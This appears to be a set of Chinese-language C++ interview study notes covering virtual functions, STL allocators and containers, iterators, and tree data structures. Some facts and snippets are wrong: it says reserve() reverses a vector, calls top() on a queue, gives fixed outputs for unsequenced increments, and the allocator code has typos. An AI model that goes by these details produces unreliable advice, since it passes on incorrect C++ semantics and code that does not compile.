* 友元函数不能是虚函数，因为友元函数不是成员函数

#### 虚函数实现原理

[虚函数实现原理-原文](https://www.cnblogs.com/malecrab/p/5572730.html)                   图片来自原文

每一个含有虚函数（无论是其本身，还是继承而来的）的类都至少有一个与之对应的虚函数表，其存放着该类所有虚函数对应的函数指针。

![pic](http://xyongs.cn/image/virtual1-6-21.png)

其中：

* B的虚函数表中存放着B::foo和B::bar两个函数指针。
* D的虚函数表中存放中继承自B的虚函数，还有自己的虚函数

**虚函数的构造过程**

![img](http://xyongs.cn/image/virtual2-6-21.png)

**虚函数的调用过程**

![img](http://xyongs.cn/image/virtual3-6-21.png)

编译器只知道`pb`是`B*`类型的指针，并不知道它指向的具体对象类型：`pb`可能指向的是`B`的对象，也可能指向的是`D`的对象

但是对于 `pb->bar()` ，编译器能够确定的是：此处 `operator->` 的另外一个参数就是 `B::bar` （因为 `pb`是 `B*` 类型的，编译器认为 `bar` 是 `B::bar`），而`B::bar`和`D::bar`在各自的虚函数表中偏移位置是相等的。

无论`pb`指向哪种类型的对象，只要能够确定被调函数在虚函数中的偏移量，待运行时，就能确定具体类型，并找到相应的`vprt`了，就能调用具体类型，并能找到真正应该调用的函数。

**多重继承**

![img](http://xyongs.cn/image/virtual4-6-21.png)

其中：D自身的虚函数与B基类共用了一个虚函数表，因此称B为D的主基类。

虚函数替换过程和前面描述的类似，只是多个一个虚函数表，多了一次拷贝和替换的过程

### 🏷 虚继承

虚继承用于解决多继承条件下的菱形继承问题

### 🏷 重载和覆盖

**重载**：两个函数同名，但是参数列表**（参数个数，类型，顺序）**不同，返回值类型没有要求，在同一个作用域中，const修饰的同名函数也算。

> **用处**：用于处理实现功能相似而数据类型不同的问题，减少函数名的数量，避免名字空间的污染，提升可读性

**重写** ：子类继承了父类，父类中的函数是虚函数，在子类中重新定义了这个虚函数，这种情况是重写

C++中不仅函数可以重载，运算符也可以重载

**❓c语言为什么不能支持函数重载？**

编译器只会对函数进行简单的重命名，不能区分

**❓C++函数重载底层是如何处理的？**

编译器将同名不同参的函数在符号表中生成不同的名字，编译器根据调用者传入的参数类型和个数可以唯一确定调用哪一个函数。

### 🏷 静态函数与虚函数

静态函数在编译的时候就已经确定运行时机，虚函数在运行的时候动态绑定。虚函数因为用了虚函数表机制，调用的时候会增加一次开销内存。

### 🏷 析构函数与虚函数

**❓为什么析构函数必须是虚函数？为什么默认的析构函数不是虚函数？**

1、将可能会被继承的父类的析构函数设置为虚函数，可以保证当我们new一个子类时，然后使用基类 指针指向该子类对象，释放基类指针可以释放掉子类的空间，防止内存泄漏

2、C++默认的析构函数不是虚函数，是因为虚函数需要额外的虚函数表和虚函数指针，占用额外的内存。而对不会被继承的类来说，其析构函数如果是虚函数，就会浪费内存。因此C++默认的析构函数不是虚函数，而是只有当需要当做父类时，设置为虚函数。

### 🏷 函数

**❓C++如何进行函数调用？**

每个函数调用都会分配函数栈，在栈内进行函数执行过程，调用前，先把返回地址压栈，然后把当前函数的esp指针压栈

**❓C++如何处理返回值**

生成一个临时变量，把它的引用作为函数参数传入函数内。

**❓C++中拷贝赋值函数的形参能否进行值传递？**

不能。如果是这种情况下，调用拷贝构造函数的时候，首先要将实参传递给形参，这个传递的时候又要调用拷贝构造函数。如此循环，无法完成拷贝，栈也会满。

### 🏷 ❓delete this合法吗？

合法，但

* 必须保证 `this` 对象是通过 `new` 分配的
* 必须保证调用 `delete this` 的成员函数是最后调用`this`的成员函
* 必须保证成员函数的`delete this` 后面没有调用 `this` 了
* 必须保证 `delete this`后面没人使用了

### 🏷 ❓如何定义一个只能在堆上（栈上）生成的对象？

**只能在堆上**

方法：将析构函数设置为私有

原因：C++是静态绑定语言，编译器管理栈上的对象的生命周期，编译器在为类对象分配栈空间时，会先检查类的析构函数的访问性。若析构函数不可访问，则不能在栈上创建对象。

**只能在栈上**

方法：将new和delete重载为私有

原因：在堆上生成对象，使用new关键字操作，其过程分为两阶段：第一阶段，使用new在堆上寻找可用内存，分配给对象；第二阶段，调用构造函数生成对象。将new操作设置为私有，那么第一阶段就无法完成，就不能在堆上生成对象

### 🏷 c++11新特性

#### Lambda表达式（匿名函数）

使用STL时，往往会使用函数对象，为此要编写很多函数对象类。有的函数对象类只用来定义了一个对象，而且这个对象也只用了一次，编写这样的函数对象类就有的浪费。

lambda表达式

```c++
[外部变量访问方式说明符](参数表)->返回值类型
{
    语句块
}
```

其中，“外部变量访问方式说明符” 可以是 `=` 或 `&`，表示`{}`用到的、定义在`{}`外面的变量在`{}`中是允许被改变的。`=`表示不允许，`&`表示允许。当然在{}中也可以不使用定义在外面的变量。“->返回类型"可以省略。

```c++
int a[4] = {11,2,33,4};
sort(a, a+4, [=](int x, int y)->bool {return x%10 < y % 10;});
```

### 🏷 c++静态库与动态库的区别

对于unix系统，静态库为.a ，动态库为.so。而Windows系统静态库为.lib，动态库为.dll。

回顾程序编译的四个步骤：

预编译->编译->汇编->链接

静态库和动态库就是在链接节点行为不同，静态库会在链接阶段将汇编生成的目标文件与引用的库一起链接打包到可执行文件中。

静态库特点：

- 静态库对函数的链接在编译时期完成
- 程序在运行时与函数库再无关系
- 浪费资源空间，因为所有相关的目标文件都会被链接到一个可执行文件中

动态链接库

动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。**不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例**，规避了空间浪费问题。动态库在程序运行是才被载入，也解决了静态库对程序的更新、部署和发布页会带来麻烦。用户只需要更新动态库即可，**增量更新**。

使用动态库的原因，正式因为静态库很耗费内存空间，并且静态库更新简直是灾难，如果库源码发生变动，那么静态库将不得不重新生成。
动态库特点如下：

- 延迟加载一些库函数，既用到才加载
- 动态库可以同时被多个程序共享，节省内存

### 虚函数表是针对类还是针对对象的？虚表存在哪里？

- 虚函数表属于类，类的所有对象共享这个类的虚函数表。
- 不同对象虚函数表是一样的（虚函数表的第一个函数地址相同）；
- 每个对象内部都保存一个指向该类虚函数表的指针vptr，每个对象的vptr的存放地址都不一样，但是都指向同一虚函数表。

https://blog.csdn.net/qq_28584889/article/details/88756022

结论

1. 虚函数表属于类，类的所有对象共享这个类的虚函数表。
2. 虚函数表由编译器在编译时生成，保存在.rdata只读数据段。

### 🏷 面试问题

**当`i`是一个整数的时候`++i`和`i++`哪个更快一点？ `i++`和`++i`的区别是什么？**

A：理论上是`++i`更快；实际上与编译器优化有关，通常几乎无区别。

```c
// i++代码实现
int operator++(int)
{
    int temp = *this;
    ++*this;
    return temp;
} // 返回一个int型的对象本身
// ++i
int& operator++()
{
    *this += 1;
    return *this;
} // 返回一个int型对象引用。
//可以不停的嵌套++i；
++(++i)
```

`i++`返回的是`i`的值， `++i`返回的是 `i+1`的值

```c
int i = 1;
printf("%d, %d\n", ++i, ++i);  //3, 3   ++i 返回的是*this 会与this指向的内容有关
printf("%d, %d\n", ++i, i++);  //5, 3   i++ 返回的是temp，一个预先保留的值
printf("%d, %d\n", i++, i++);  //6, 5
printf("%d, %d\n", i++, ++i);  //8, 9

注意：上述与输出与编译器类型有关，有些输出不一样，有些编译器会报错
```

**auto_ptr能作为vector的元素吗？为什么？**

A：不可以。

当复制一个auto_ptr时，它所指向的元素的对象的所有权被交付到被复制的auto_ptr上面，而它自身被复制设置为null。复制一个auto_ptr意味着改变它的值。出错。

## 📚Effective C++

### 构造/析构/赋值运算

#### 条款5：C++定义类是默认含有的函数

默认构造函数、析构函数、拷贝赋值函数、拷贝赋值操作符

```c++
Class Empty{
public:
  Empty(){..};
  Empty(const Empty& rhs){...};
  ~Empty(){..}
  Empty& operator=(const Empty& rhs){...}
};
```

#### 条款6：不想自动生成类中函数应该明确拒绝

delete

将其设为私有

#### 条款7：为多态基类声明virtual析构函数

#### 条款8：别让异常逃离析构函数

#### 条款9：绝不在构造和析构过程中调用virtual函数

Base class构造期间virtual函数绝不会下降到derived class阶层。

在析构函数中，一旦析构函数被执行，对象内的derived class成员变量便呈未定义值。C++视他们不存在。

## 📚STL

《STL源码解析》-侯捷

### 🏷 概述

STL提供六大组件

1、**容器**：各种数据结构， 如vector，list， deque, set， map，用来存放数据；

2、**算法**：各种常见算法如sort，search，copy，erase

3、**迭代器**：扮演容器与算法之间的胶合剂，是所谓的“泛型指针”

4、**仿函数**：行为类似函数，可以作为算法的某种策略

5、**配接器**：一种用来修饰容器或仿函数或迭代器接口的东西

6、**空间配置器**：负责空间配置与管理

### 🏷 空间配置器

[参考](https://blog.csdn.net/md521/article/details/42046043)

STL采用二级配置器结构

讨论的是---SGI空间配置器

**1、第一级配置器**

以malloc(), free(), realloc()等C函数执行实际内存配置、释放、重新配置等操作，若调用malloc(),realloc()不成功，会去循环调用“内存空间不足处理例程”，期望某次调用后获得足够的内存空间而圆满的完成任务，若还是不成功，返回异常

一级空间配置器分配的是大于128字节的内存

如果分配不成功，调用句柄释放一部分内存，若还是分配不成功，抛出异常

**2、二级配置器**

当配置区块超过128B时调用一级配置器；否则采用内存池管理空间分配

工作流程：

当使用二级配置器时，从自由链表维护的内存块中申请内存，若没有对应申请大小的自由链表，则从内存池中申请内存构造自由链表，内存池内存不足时，从堆中申请内存填充内存池

**自由链表**：复杂维护不同大小的内存块，由于二级配置器会将内存需求量上调为8的倍数，且能够分配的最大内存为128B，则自由链表的个数为16个；每个链表分别维护内存大小为8，16，24，32，48......128的内存空间大小

![img](http://www.xyongs.cn/image/stl_malloc.png)

**一级配置器 __malloc_alloc_template 剖析**

```c
template<int inst>
class __malloc_alloc_template
{
  private:
  	//以下都是函数指针，所代表的函数将用来处理内存不足的情况
  	// oom: out of memory
  	static void *oom_malloc(size_t);
  	static void *oom_realloc(void*, size_t);
  	static void (* __malloc_alloc_oom_handler)();
  public:
  	static void * allocate(size_t n)
    {
      void *result = malloc(m);  //一级配置器直接使用malloc();
      if (0 ==  result) result = oom_malloc(n); //无法满足时，使用oom_malloc
      return result;
    }
  	static void deallocate(void *p, size_t)
    {
      free(p);  //一级配置器直接使用free释放
    }
  	static void *reallocate(void *p, size_t, size_t new_sz)
    {
      void *result = realloc(p, new_sz);  //一级配置器直接使用
      if (0 == result) result = oom_realloc(p, new_sz);
      return result;
    }
};
tempate<int inst>
void (* __malloc_alloc_template<inst>::__malloc_alloc_oom_handler)() = 0;

tempate<int inst>
void * __malloc_alloc_tempate<inst>::oom_malloc(size_t n)
{
  void (* my_alloc_handler)();
  void *result;
  
  for (;;){  //不断尝试释放、配置、再释放、再配置
    my_malloc_hander = __malloc_alloc_oom_handler;
    if (0 == my_malloc_hander) {__THROW_BQD_ALLOC;}
    (*my_malloc_hander)();  // 调用处理例程，企图释放内存
    result = malloc(n);   //再次尝试配置内存
    if (result) return (result);
  }
}

tempate<int inst>
void *__malloc_alloc_tempate<inst>::oom_realloc(void *p, size_t n)
{
  void (* my_alloc_handler)();
  void *result;
  for (;;){  //不断尝试释放、配置、再释放、再配置
    my_malloc_hander = __malloc_alloc_oom_handler;
    if (0 == my_malloc_hander) {__THROW_BQD_ALLOC;}
    (*my_malloc_hander)();  // 调用处理例程，企图释放内存
    result = realloc(p, n);   //再次尝试配置内存
    if (result) return (result);
  }
}
```

SGI 第一级配置器的 `allocate()` 和 `realloc()` 都是在调用`malloc()` 和`realloc()`不成功后，调用`oom_malloc()` 和 `oom_realloc()`. 后两者都有内循环，不断调用 "内存不足处理例程".

**第二级配置器 __default_alloc_template 剖析**

二级配置器多了一些机制，避免太多小额区块造成内部碎片

```cpp
enum {__ALIGN = 8};
enum {_MAX_BYTES = 128};
enum {_NFREELISTS = __MAX_BYTES/__ALIGN}; //free-lists个数
template<bool threads, int inst>
class __default_alloc_template {
private:
  // 将bytes上调至8的倍数
  static size_t ROUND_UP(size_t bytes){
    return (((bytes) + __ALIGN-1) & ~(__ALIGN - 1))
  }
private:
  union obj {  // free-lists节点构造
    union obj * free_list_link;
    char client_data[1];  
  };
private:
  //16个free-lists
  static obj * volatile free_list[_NFREELISTS];
  //根据块大小，决定使用第n号free-list. n 从 1 开始
  static size_ FREELIST_INDEX(size_t bytes){
    return (((bytes) + __ALIGN-1) / __ALIGN - 1);
  }
  //返回一个大小为n的对象，并可能加入大小为n的其他区块到freelist
  static void *refill(size_t n);
  
  //配置一大块空间，可容纳nobjs个大小为 size 的区块
  // 如配置nobjs个区块有所不便，nobjs可能会降低
  static char *chunk_alloc(size_t size, int &nobjs);
  
  static char *start_free;  //内存池起始位置
  static char *end_free;
  static size_t heap_size;
public:
  static void *allocate(size_t n);
  static void deallocate(void *p, size_t n);
  static void *reallocate(void *p, size_t old_sz, size_t new_sz);
};

//初始化
template<bool threads, int inst>
char *__default_alloc_template<threads, inst>::start_free = 0;
template<bool threads, int inst>
char *__default_alloc_template<threads, inst>::end_free = 0;
template<bool threads, int inst>
char __default_alloc_template<threads, inst>::heap_size = 0;
template<bool threads, int inst>
char __default_alloc_template<threads, inst>::obj *volatile 
  __default_alloc_template<threads, inst>::free_list[__NFREELISTS] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
```

**空间配置器函数 allocate()**

```c
static void * allocate(size_t n)
{
  obj *volatile * my_free_list;
  obj *result;
  
  //大于128调用一级配置器
  if (n > (size_t) __MAX_BYTES){
    return (malloc_alloc::allocate(n));
  }
  //寻找16个free lists中合适的一个
  my_free_list = free_list + FREELIST_INDEX(n);
  result = *my_free_list;
  if (0 == result)
  {
    //没有找到，准备重新填充free_list
    void *r = refill(ROUND_UP(n));
    return r;
  }
  //调整free list
  *my_free_list = result->free_list_link;
  return (result);
}
```

**重新填充free lists**

当`free list`中没有可以的区块了时，就调用 `refill()` 新的空间取自内存池，省缺的取得20个新节点。

**内存池**

当内存足够时，直接调出20个区块返回给`free list`, 如果不足20个，但是足够供应一个以上，就拨出这不足20个区块空间出去。

若完全没有空间了，便需要利用`malloc`在`heap`上配置内存，请求的内存为需求量的两倍，再加上一个随着配置次数增大而愈来愈多的附加量

**例**

假设，程序一开始就调用`chunk_alloc(32,20)`,于是`malloc()`配置40个32bytes区块，其中第1个交出，另19个交给`free_list[3]`维护，余20个留个内存池。

接下来程序调用`chunk_alloc(64, 20)`，此时`free_list[7]`空空如也，必须向内存池要求支持。内存池也只有 (32*20)/64 = 10个64bytes区块，就把这10个区块返回，第1个交给客端，余9个有`free_list[7]`维护。此时内存池为空，在申请是要加上**附加量**

另：若system_heap空间不足，想法去其它内存中取，若最后还是失败返回bad_alloc异常。

注：`chunk_alloc(b, s)` 向内存池中取空间 s个大小为b bytes

### 🏷 迭代器

根据STL中的分类，`iterator`包括：

**输入迭代器**（`Input Iterator`）：通过对输入迭代器解除引用，它将引用对象，而对象可能位于集合中。最严格的输入迭代只能以只读方式访问对象。例如：`istream`。 

**输出迭代器**（`Output Iterator`）：该类迭代器和`Input Iterator`极其相似，也只能单步向前迭代元素，不同的是该类迭代器对元素只有写的权力。例如：`ostream, inserter`。 

以上两种基本迭代器可进一步分为三类：

**前向迭代器**（`Forward Iterator`）：该类迭代器可以在一个正确的区间中进行读写操作，它拥有`Input Iterator`的所有特性，和`Output Iterator`的部分特性，以及单步向前迭代元素的能力。

**双向迭代器**（`Bidirectional Iterator`）：该类迭代器是在`Forward Iterator`的基础上提供了单步向后迭代元素的能力。例如：`list, set, multiset, map, multimap`。

**随机迭代器**（`Random Access Iterator`）：该类迭代器能完成上面所有迭代器的工作，它自己独有的特性就是可以像指针那样进行算术计算，而不是仅仅只有单步向前或向后迭代。例如：`vector, deque, string, array`。 

**1 Input Iterators**

`Input Iterator`只能逐元素的向前遍历，而且对元素是只读的，只能读取元素一次。通常这种情况发生在从标准输入设备（通常是键盘）读取数据时。

下面是`Input Iterator`的可用操作列表：

`*iter`: 只读访问对应的元素 

`iter->member`: 只读访问对应元素的成员 

`++iter`: 向前遍历一步（返回最新的位置) 

`iter++`: 向前遍历一步（返回原先的位置） 

`iter1 == iter2`: 判断两个迭代器是否相等 

`iter1 != iter2`：判断两个迭代器是否不等 

`TYPE(iter)`: 复制迭代器 

**2 Output Iterators**

`Output iterator`跟`Input Iterator`相对应，只能逐元素向前遍历，而且对元素是只写的(`*iter`操作不能作为右值，只能作为左值)，只能写入元素一次。通常这种情况发生在向标准输出设备(屏幕或者打印机)写入数据时，或者利用`inserter`向容器中追加新元素时。

**3 Forward Iterators**

`Forward Iterator`是`Input Iterator`和`Output Iterator`的结合，虽然也只能逐元素向前遍历，但可以对元素进行读写操作。下面看`Forward Iterator`的可用操作列表

**4 Bidirectional Iterators**

双向迭代器行为特征类似于`Forward Iterator`，只是额外增加了一个逐元素向后遍历的能力。所以对于双向迭代器可用的操作，除了包含`Forward Iterator`的所有操作外，多了一组向后遍历的操作：

**5 Random Access Iterators**

随机访问迭代器除了有双向迭代器的能力特征外，还可以进行元素随机访问。所以对于随机访问迭代器，增加了关于“迭代器运算”的一些操作。下面是除了双向迭代器的所有操作外，额外的操作列表：

### 🏷 序列式容器

#### vector

存储连续的线性空间

**vector的数据结构**

```c++
template<class T, class Alloc = alloc>
{
  protected:
  	iterator start;  //表示目前使用空间的头
  	iterator finish;  //表示目前使用空间的尾
  	iterator end_of_storage;  //表示目前可以空间的尾
}
```

vector**调用构造函数的操作流程**

```c
//构造函数，指定大小n，初值 value
vector<size_type n, const T& value> {fill_initialize(n, value);}

//填充并予以初始化
fill_initialize(size_type n, const T& value)
{
  start = allocate_and_fill(n, value);
  finish = start + n;
  end_of_storage = finish;
}

//配置而后填充
iterator allocate_and_fill(size_type n, const T& x)
{
  iterator result = data_allocator::allocate(n);  // 配置n个元素的空间
  uninitialized_fill_n(result, n, x);
  return result;
}
```



1、**迭代器**：Random Access Iterators。

vector维护一个连续线性空间，支持随机存取。

2、**构造与内存管理**

![image](http://www.xyongs.cn/image/vector.png)

当我们以push_back()将新元素插入vector尾端时，该函数首先检查是否还有备用空间，若有直接在备用空间中构造元素，并调整迭代器，若没有就扩充空间（重新配置、移动元素、释放原空间）

<font color="red">vector是动态增加大小的，它以原来大小的两倍配置一个较大的空间，然后将原内容拷贝过来，然后在开始在原内容中构造新元素，并释放原空间。</font>

3、**操作**

| 方法                        | 含义                           |
| --------------------------- | ------------------------------ |
| pop_back()                  | 将尾端元素拿掉，并调整大小     |
| resize()                    | 调整容器大小                   |
| capacity                    | 返回当前为vector分配的容量大小 |
| reserve(i.begin(), i.end()) | 反转vector                     |
| erase(it)                   | 删除某个位置上的元素           |
| insert(pos, n,x)            | pos位置插入n个x元素            |

**vector中的resize() 和 reserver()函数**

reserver()用来给vector预分配存储区大小，即capacity的值

resize()是重新分配大小，改变容器的大小，并创建对象。

#### list

保存线性空间，每次插入或删除一个元素就配置或释放一个空间。

1、**迭代器**

Bidirectional Iterators

list是一个双向链表，迭代器必须具备前移、后移能力

2、**构成与内存管理**

每次插入或删除一个元素就配置或释放一个空间，对于任何位置的插入或删除操作都是常数时间。

3、**操作**

| 方法                | 含义                                                     |
| ------------------- | -------------------------------------------------------- |
| push_front(it)      | 头结点插入元素                                           |
| push_back(it)       | 尾结点插入                                               |
| erase(it)           | 删除                                                     |
| pop_front()         |                                                          |
| pop_back()          |                                                          |
| clear()             |                                                          |
| remove(val)         | 将数值为val所有元素移除                                  |
| unique()            | 移除数值相同的连续元素，只有连续而相同的元素才会移除一个 |
| transfer(pos, f, l) | 将[f,l) 内的元素移动到pos之前                            |
| splice(pos,x)       | 将x接合与pos所指位置之前                                 |
| merge(list &x)      | x 合并到*this上，前提：两者得有序                        |
| find(f, e, 99)      | [f,e)范围内查找99                                        |

#### deque

双端队列，一种双向开口的连续线性空间，在头尾两端可插入和删除元素。

deque是由一段一段的定量连续空间构成，一旦有必要在的确的前端或尾端增加新空间，便配置一段定量连续空间，串联在整个deque的头端或尾端。

**1、deque中控器**

deque采用一块所谓的map（不是STL的map容器）作为主控，其中的每一个节点存储的都是指针，指向另外一段连续线性空间，称为缓冲区，缓冲区才是deque的存储空间主体。

**2、迭代器**

deque的迭代器必须能够指出分段连续空间（缓冲区）在哪里，其次它能够判断自己是否已经处于所在缓冲区的边缘，如果是，一旦前进或后退时就必须跳跃至下一个或上一个缓冲区。为了能够正确跳跃，deque必须随时掌控map。

![img](http://www.xyongs.cn/image/deque_it.png)

**3、deque的结构**

deque除了维护一个map结构的指针外，还维护start，finish两个迭代器，分别指向第一个缓冲区的第一个元素，和最后一个缓冲区的最后一个元素

![img](http://www.xyongs.cn/image/deque.png)

**4、deque扩容操作**

程序一开始声明了一个deque:

`deque<int, alloc, 32> ideq(20, 9)`

其缓冲区大小为32bytes， 并令其保留20个元素空间，每个元素初值为9。

当添加元素的一端只有一个元素空间时，先配置一整块新的缓冲区，中控器将这段的的首尾地址加入到map中，再设置新的元素内容，然后更改迭代器finish的状态

#### stack

stack是一种先进后出的数据结构，它只有一个出口，它是一种容器的配接器，它的底层可以由deque或者stack实现。

![image](http://www.xyongs.cn/image/stack.png)

stack没有迭代器

#### queue

是一种先进先出的数据结构，它有两个出口，从队尾加入元素，对首取元素

![img](http://www.xyongs.cn/image/queue.png)

没有迭代器，是容器配接器，以deque或list为底层数据结构

#### heap与priority_queue

heap并不属于STL的容器组件，是priority_queue的助手

priority_queue允许用于任何次序将任何元素推入容器内，但是取出时一定从优先权最高的元素开始取出

binary max heap(二叉大根堆)就有这样的特性，很适合作为priority_queue的底层机制

![img](http://www.xyongs.cn/image/heap.png)

它是将大根堆存储在Array或vector中

**特性**

* 队列特性
* 无迭代器

![img](http://www.xyongs.cn/image/priority_queue.png)

### 🏷 关联式容器

观念上类似关联数据库，每个元素都有一个key和value，当元素被插入到关联式容器中，容器内部便依照其键值得大小，以某种特定的规则将这个元素放置于合适的位置

#### set

底层：红黑树，有序，不可重复

set的特性是，所有元素都会根据元素的键值被自动排序，set的元素不像map那样可以同时拥有value和key，set元素的键值就是实值。

**方法**

| 方法                                                         | 含义                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| begin()                                                      | 返回第一个迭代器                                             |
| end()                                                        |                                                              |
| insert(key_value)                                            | 插入值                                                       |
| lower_bound(key_val)                                         | 返回第一个大于等于key_val的迭代器                            |
| upper_bound(key_val)                                         | 返回第一个大于key                                            |
| clear()                                                      | 删除set容器中所有元素                                        |
| empty()                                                      | 判断是否为空                                                 |
| max_size()                                                   | set容器可能包含元素的最大个数                                |
| size()                                                       | 当前容器元素个数                                             |
| rbegin()                                                     |                                                              |
| rend()                                                       |                                                              |
| count(type u)                                                | 某个键出现的次数                                             |
| equal_range()                                                | 返回一对定位器，分别表示第一个大于或等于关键字 <br />和 第一个大于给定关键字的元素；返回的是一个pair |
| erase(iterator)<br />erase(first, second)<br />erase(key_value) | 删除指定迭代器<br />删除迭代器之间元素<br />删除指定key_value |
| find()                                                       | 查找指定值，返回可以，没找到的判断  `(iter = s.find(2)) != s.end()` |
| swap()                                                       | 交换两个set                                                  |

**set为vector去重**

```c++
vector<int> vec;
vec = {1,3,2,5,5,6};
set<int> st(vec.begin(), vec.end());
vec.assign(st.begin(), st.end());
```

#### map

底层：红黑树，有序，不可重复

所以元素根据键自动排序，所有元素都是pair，不允许两个元素拥有相同的键值

**方法**

与set相似

#### multiset

底层红黑树，有序，可重复

特性与set完全相同，唯一的差别在于它允许键值重复，因为它的插入操作采用的是底层机制RB-tree的`insert_equal()`而非`insert_unique()`

#### multimap

底层红黑树，有序，可重复

参考multiset与set的关系

#### unordered_set

底层哈希表，无序，不可重复

#### unordereded_multiset

底层哈希表，无序，可重复

#### unordered_map

底层哈希表，无序，不可重复

#### unordered_multimap

底层哈希表，无序，可重复

----------------------------------------

#### hashtable

hash函数（散列函数）：除留取余法

**碰撞问题**

线性探测法：直接寻找后一个空位置

二次探测法：采用二次hash，对计算出的值再hash一遍

开链法：

#### 关联式容器比较

* map：底层红黑树，key不重复
* multimap: 底层红黑树，key可以重复
* Hashmap: 底层hashtable
* unordered_map:底层hashtable，C++11添加，空间复杂度比hashmap高 是C++11用来代替hashmap。支持复杂的对象做kay，key不重复

### 🏷 算法 

#### Sort

在数据量大时采用Quick Sort，分段递归排序。一旦分段后的数据量小于某个门槛，为避免Quick Sort的递归调用带来过大的额外负荷，就改用insertion Sort。如果递归层次过深，还会改用Heap Sort。

## 📚 数据结构

**顺序结构：**

栈，队列（非循环队列、循环队列），数组，vector

```cpp
//栈
template <class T>
struct stackNode
{
  T data;
  stackNode *next;
}
```

[单调栈：](https://labuladong.gitbook.io/algo/shu-ju-jie-gou-xi-lie/dan-tiao-zhan)

[496.下一个更大元素I](https://leetcode-cn.com/problems/next-greater-element-i)

[503.下一个更大元素II](https://leetcode-cn.com/problems/next-greater-element-ii)

[1118.一月有多少天](https://leetcode-cn.com/problems/number-of-days-in-a-month)

[单调队列:](https://labuladong.gitbook.io/algo/shu-ju-jie-gou-xi-lie/dan-tiao-dui-lie)

[239.滑动窗口最大值](https://leetcode-cn.com/problems/sliding-window-maximum/)

**链式结构**：

单链表，双链表，循环列表

**哈希表**

**树**：二叉搜索树，平衡二叉树，红黑树，哈夫曼树，前缀树

**图**：遍历（dfs， bfds), 最小生成树，最短路径，拓扑排序，AOE，关键路径

### 🏷 广义表

是一种非线性的数据结构，是线性表的一种推广。即[广义表]([https://baike.baidu.com/item/%E5%B9%BF%E4%B9%89%E8%A1%A8](https://baike.baidu.com/item/广义表))中方式对表元素的原子限制，容许它们具有自身结构。

![img](https://raw.githubusercontent.com/huihut/interview/master/images/GeneralizedList2.png)

### 🏷 哈希表

哈希：散列值，把任意长度的输入，通过散列算法，变换成固定长度的输出，该输出就是散列值。

问题：散列值的空间远远小于输入的空间，不同的输入可能造成相同的输出。

碰撞：两个不同的输入值，根据同一散列函数计算出来的散列值相同的现象

常见Hash函数：

* 直接地址法：直接以key或者key加上某个常数作为哈希地址
* 数字分析法：提取关键字中取值比较均匀的数字作为哈希地址。
* **除留余数法**：用关键字k除以某个不大于哈希表长度m的数p，将所得余数作为哈希表地址
* 分段叠加法：按照哈希表地址位数将关键字分成位数相等的几部分，其中最后一部分可以比较短。然后将这几部分相加，舍弃最高进位后的结果就是该关键字的哈希地址。
* 平方取中法：如果关键字各个部分分布都不均匀的话，可以先求出它的平方值，然后按照需求取中间的几位作为哈希地址。
* 伪随机数法：采用一个伪随机数当作哈希函数。
* 链地址法

- 将哈希表的每个单元作为链表的头结点，所有哈希地址为i的元素构成一个同义词链表。即发生冲突时就把该关键字链在以该单元为头结点的链表的尾部。

### 🏷 二叉树🌲

```cpp
struct TreeNode
{
  type value;
  TreeNode *left, *right;
}
```

**遍历方式**

* 前序遍历：中左右
* 中序遍历：左中右
* 后续遍历：左右中

[从前序与中序遍历序列构造二叉树](https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/submissions/)

[100.相同的树](https://leetcode-cn.com/problems/same-tree)

[450.删除二叉搜索树中的节点](https://leetcode-cn.com/problems/delete-node-in-a-bst)

[701.二叉搜索树中的插入操作](https://leetcode-cn.com/problems/insert-into-a-binary-search-tree)

[700.二叉搜索树中的搜索](https://leetcode-cn.com/problems/search-in-a-binary-search-tree)

[98.验证二叉搜索树](https://leetcode-cn.com/problems/validate-binary-search-tree)

**非递归遍历**

```c++
//层序  使用队列
void func(TreeNode* root)
{
    if (root == NULL) return;
    queue<TreeNode*> q;
    q.push(root);
    while(!q.empty())
    {
        TreeNode *node = q.top();
        q.pop();
        cout << node->val << ",";
        if (node->left) q.push(node->left);
        if (node->right) q.push(node->right);
    }
}
//非递归先序(中序) ， 非递归手法
void func(TreeNode* root)
{
    if (root == NULL) return;
    stack<TreeNode*> s;
    TreeNode *node = root;
    while(node != NULL || !s.empty())
    {
        if (node != NULL)
        {
            cout << node->val << ",";
            s.push(node);
            node = node->left;
        } else
        {
            TreeNode * n = s.top();
            //将输出放在此处为中序遍历
            s.pop();
            node = n->right;
        }
    }
}
//后序遍历 两个栈
void func(TreeNode* root)
{
    if (root == NULL) return;
    stack<TreeNode*> s1;
    stack<TreeNode*> s2;
    s1.push(root);
    TreeNode* node = root;
    while(!s1.empty())
    {
        node = s1.top();
        s1.pop();
        if (node->left != NULL)
        {
            s1.push(node->left);
        }
        if (node->right != NULL)
        {
            s1.push(node->right);
        }
        s2.push(node);
    }
    while(!s2.empty())
    {
        cout << s2.top()->val << ",";
        s2.pop();
    }
}

```



### 🏷 平衡二叉树（AVL)🌲

左右子树高度差不超过1，左右子树也是平衡二叉树

**旋转**：如果在AVL树中进行插入或删除节点操作后，可能导致AVL树失去平衡。这种失去平衡可以概括为4种姿态：LL（左左），LR， RR，RL。

参考：https://www.pdai.tech/md/algorithm/alg-basic-tree-balance.html

### 🏷 二叉搜索树(BST)🌲

二叉搜索树（Binary Search Tree，简称 BST）是一种很常用的的二叉树。它的定义是：一个二叉树中，任意节点的值要大于等于左子树所有节点的值，且要小于等于右边子树的所有节点的值

### 🏷 红黑树🌲

[红黑树](https://blog.csdn.net/tanrui519521/article/details/80980135)

红黑树是一棵自平衡二叉搜索树，它的每一个节点增加了存储节点颜色，红或黑；

通过任意一条从根到叶子简单路径上的颜色束缚，保证最长路径不超过最短路径的两倍

**性质**：

* 每一个节点不是红就是黑
* 根节点是黑的
* 没有连续的红节点
* 每个节点到叶子节点的路径中，黑色节点数目相同

**调整**：

1、变色

2、左旋

​	以某个结点作为支点，其右子结点变成支点的父节点，右子结点的左子结点变成支点的右子结点。

3 、右旋

​	以某一个结点为支点，其左子结点变成支点的父节点，左子结点的右子结点变成支点的左子结点。

**❓红黑树、B+树、B树的区别？**

* 红黑树的深度比较大，而B树和B+树的深度则小一些
* B+树将数据存储在叶子节点，同时通过链表的形式将他们链接在一个

### 🏷 堆

https://www.jianshu.com/p/6b526aa481b1

